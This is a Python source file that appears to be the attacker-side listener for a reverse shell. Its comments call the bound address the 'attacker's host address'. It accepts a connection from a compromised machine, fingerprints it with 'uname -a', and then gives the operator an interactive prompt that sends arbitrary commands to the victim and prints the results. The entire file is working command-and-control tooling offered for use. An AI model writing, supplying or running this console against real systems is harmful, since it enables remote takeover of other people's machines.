
import socket,subprocess as sp ,sys,os
from colorama import  Fore,Style


def recv_data(connection):
    response = connection.recv(1024)
    total_size = int(response[:16])
    response = response[16:]
    while total_size > len(response): #start loop
        data = connection.recv(1024) #to receive the remaining data
        response += data #output exceeds 1024 
    response = response.decode('utf-8')
    print (Fore.BLUE + "%s" %response.replace('\\', '\n'))
    print(Fore.RESET)

def send_data(connection,data):
    data = data.encode('utf-8')
    try:
        connection.send(data)
        recv_data(connection)
    except socket.error as e :
        print(Fore.RED + "[-] Unable to send data" + Fore.RESET)

def console(connection, ip,port):
    print (Fore.GREEN + "[Info]" + Fore.RESET, Fore.BLUE +  " Connection Established from: %s:%s " %(ip,port) + Fore.RESET)

    msg = "uname -a"
    connection.send(msg.encode("utf-8"))
    sysinfo = connection.recv(1024)
    sysinfo = sysinfo[16:]
    sysinfo = sysinfo.decode('utf-8').split(" ")

    print (Fore.GREEN + "Operating System :" + Fore.RESET, Fore.BLUE + "%s" % sysinfo[0] + Fore.RESET)
    print (Fore.GREEN + "Node Name  :" + Fore.RESET, Fore.BLUE + "%s" % sysinfo[1] + Fore.RESET),

    user = sysinfo[1] +'@'+ip
    while 1 : #Run a while loop to inintiate the reverse connection 
        command = input(Fore.RED + '%s >' %user) #Command to enter on server 
        print( Fore.RESET)
        if command == "cls":
            dp = os.system("clear")
        elif command == "exit()":
            command = "exit()".encode('utf-8')
            connection.send(command)
            print (Fore.BLUE + "[+] " + Fore.RESET),
            print (Fore.GREEN + "Shell Going Down" + Fore.RESET)
            connection.close()
        elif command != "exit()" : #if command is not exit(), execute
            if command  != "" : #continue if command is empty
                response = send_data(connection, command)
                print ("%s" %response)
        elif command == "":
            continue
        else:
            print (Fore.RED + "[!] UnKown command" + Fore.RESET)
def main_control():
    try:
        host = sys.argv[1] #attacker's host address
        port = int (sys.argv[2]) #attacker's host port
    except Exception as e :
        print (Fore.RED + "[-] Socket Information Not Provided" + Fore.RESET)
        sys.exit(1)
    print (Fore.GREEN + "[*] " + Fore.RESET, Fore.BLUE + "Server Started Successfully " + Fore.RESET + Fore.CYAN),
    print (Fore.RESET)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #setup socket

    s.bind((host,port)) #Bind the socket
    s.listen(5) #Max coonections: 5

    if host == "":
        host = "localhost"

    print(Fore.GREEN + "[*]" + Fore.RESET, Fore.BLUE +  "Listening on %s:%d ... " %(host,port) + Fore.RESET)
    try:
        conn,addr = s.accept()
        sysi = conn.recv(2048)
        # sysi = conn.recv(2048).split(",")
 
    except KeyboardInterrupt:
        print(Fore.RED + "[-] User Requested An Interrupt" + Fore.RESET)
        sys.exit(0)

    console(conn,str(addr[0]),str(addr[1]))

if __name__ == '__main__':
    main_control()